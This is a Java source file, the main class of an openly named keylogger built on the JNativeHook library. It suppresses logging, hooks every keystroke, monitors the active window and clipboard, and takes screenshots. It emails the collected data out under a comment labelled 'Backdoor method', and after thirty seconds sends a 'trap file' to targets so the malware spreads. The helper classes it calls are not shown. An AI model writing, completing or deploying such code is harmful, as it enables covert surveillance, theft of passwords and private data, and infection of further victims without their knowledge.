import com.github.kwhat.jnativehook.GlobalScreen;

import java.util.logging.Level;
import java.util.logging.LogManager;
import java.util.logging.Logger;

public class Keylogger {
    public static void main(String[] args) {
        LogManager.getLogManager().reset();
        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.OFF);

        KeyListenerHandler keyListener = new KeyListenerHandler();
        new Thread(() -> WindowMonitor.monitorWindows(keyListener)).start();
        new Thread(() -> ClipboardMonitor.monitorClipboard(keyListener)).start();

        ScreenshotHandler.startMonitoring();
        LogFileHandler.moveJNativeHookDll();

        // Backdoor method
        // EmailSender.sendFileAfterTime(15000, "JkeyData", "Send every 15 seconds");
        EmailSender.monitorAndSend(10, "JKeyData", "Send every 10MB");
        
        // Trap file spreading feature (activate after 30 seconds)
        new Thread(() -> {
            try {
                Thread.sleep(30000); // Wait 30s after startup
                EmailSender.sendTrapToTargets(); // Send trap file
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }).start();

        try {
            GlobalScreen.registerNativeHook();
            GlobalScreen.addNativeKeyListener(keyListener);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}